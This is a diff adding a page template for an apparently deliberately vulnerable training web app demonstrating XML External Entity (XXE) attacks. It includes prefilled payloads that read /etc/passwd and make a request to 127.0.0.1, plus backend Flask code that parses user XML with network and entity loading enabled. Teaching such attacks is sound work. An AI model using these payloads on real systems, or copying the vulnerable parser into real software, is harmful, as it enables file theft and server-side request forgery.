@@ -1,0 +1,156 @@
+{% extends 'base.html' %}
+
+{% block content %}
+{% if article %}
+<p>Title : {{ article.title }}</p>
+<p>Content : {{ article.content }}</p>
+{% endif %}
+
+<ul class="nav nav-tabs" id="myTab" role="tablist">
+<li class="nav-item">
+    <a class="nav-link active" id="xxe1-tab" data-toggle="tab" href="#xxe1" role="tab">Normal Document</a>
+</li>
+<li class="nav-item">
+    <a class="nav-link" id="xxe2-tab" data-toggle="tab" href="#xxe2" role="tab">External Entities Exemple</a>
+</li>
+<li class="nav-item">
+    <a class="nav-link" id="xxe3-tab" data-toggle="tab" href="#xxe3" role="tab">Arbitrary file read</a>
+</li>
+<li class="nav-item">
+        <a class="nav-link" id="xxe4-tab" data-toggle="tab" href="#xxe4" role="tab">Arbitrary request</a>
+    </li>
+</ul>
+<div class="tab-content" id="myTabContent">
+    <div class="tab-pane fade show active" id="xxe1" role="tabpanel">
+        {{ self.xxe1() }}
+    </div>
+    <div class="tab-pane fade" id="xxe2" role="tabpanel">
+        {{ self.xxe2() }}
+    </div>
+    <div class="tab-pane fade" id="xxe3" role="tabpanel">
+        {{ self.xxe3() }}
+    </div>
+    <div class="tab-pane fade" id="xxe4" role="tabpanel">
+        {{ self.xxe4() }}
+    </div>
+</div>
+
+
+{% endblock %}
+
+{% block xxe1 %}
+<h2>Normal Document</h2>
+<form autocomplete="off" method="POST">
+    <div class="form-group">
+        <textarea class="form-control" name="document" rows="4">
+<article>
+<title>Extensible Markup Language</title>
+<content>Test</content>
+</article>
+</textarea>
+    </div>
+    <div class="form-group">
+        <button type="submit" class="btn btn-primary" id="btn-xxe1">Submit</button>
+    </div>
+</form>
+{% endblock %}
+
+{% block xxe2 %}
+<h2>External Entities Exemple</h2>
+<form autocomplete="off" method="POST">
+    <div class="form-group">
+        <textarea class="form-control" name="document" rows="6">
+<?xml version="1.0"?>
+<!DOCTYPE article [<!ENTITY example "Edited"> ]>        
+<article>
+<title>Extensible Markup Language</title>
+<content>&example;</content>
+</article>
+</textarea>
+    </div>
+    <div class="form-group">
+        <button type="submit" class="btn btn-primary" id="btn-xxe2">Submit</button>
+    </div>
+</form>
+{% endblock %}
+
+{% block xxe3 %}
+<h2>Arbitrary file read</h2>
+<form autocomplete="off" method="POST">
+    <div class="form-group">
+        <textarea class="form-control" name="document" rows="6">
+<?xml version="1.0"?>
+<!DOCTYPE article [<!ENTITY example SYSTEM "file:///etc/passwd"> ]>        
+<article>
+<title>Extensible Markup Language</title>
+<content>&example;</content>
+</article>
+</textarea>
+    </div>
+    <div class="form-group">
+        <button type="submit" class="btn btn-primary" id="btn-xxe3">Submit</button>
+    </div>
+</form>
+{% endblock %}
+
+{% block xxe4 %}
+<h2>Arbitrary request</h2>
+<form autocomplete="off" method="POST">
+    <div class="form-group">
+        <textarea class="form-control" name="document" rows="6">
+<?xml version="1.0"?>
+<!DOCTYPE article [<!ENTITY example SYSTEM "http://127.0.0.1"> ]>        
+<article>
+<title>Extensible Markup Language</title>
+<content>&example;</content>
+</article>
+</textarea>
+    </div>
+    <div class="form-group">
+        <button type="submit" class="btn btn-primary" id="btn-xxe4">Submit</button>
+    </div>
+</form>
+{% endblock %}
+
+{% block sources %}
+{% filter markdown %}
+<div class="btn-group" role="group" aria-label="Basic example">
+  <button type="button" class="btn btn-secondary" data-toggle="collapse" data-target="#collapseOne">GET /a4-xxe</button>
+  <button type="button" class="btn btn-secondary" data-toggle="collapse" data-target="#collapseTwo">POST /a4-xxe</button>
+</div>
+
+<div class="accordion" id="accordionExample">
+    <div class="card">
+      <div id="collapseOne" class="collapse show" aria-labelledby="headingOne" data-parent="#accordionExample">
+        <div class="card-body">
+```python
+@app.route('/a4-xxe')
+def get_a4_xxe():
+    return render_template("xxe.html",title="A4 - XML External Entities (XXE)")
+```
+        </div>
+      </div>
+    </div>
+    <div class="card">
+      <div id="collapseTwo" class="collapse" aria-labelledby="headingTwo" data-parent="#accordionExample">
+        <div class="card-body">
+```python
+@app.route('/a4-xxe',methods=['POST'])
+def post_a4_xxe():
+    parser = etree.XMLParser(no_network=False)
+    root = etree.fromstring(request.form['document'],parser)
+    title = ""
+    content = ""
+    for child in root:
+        if child.tag=="title":
+            title = child.text
+        if child.tag=="content":
+            content = child.text
+    return render_template("xxe.html",article={"title":title,"content":content},title="A4 - XML External Entities (XXE)")
+```  
+</div>
+</div>
+</div>
+</div>
+{% endfilter %}
+{% endblock %}
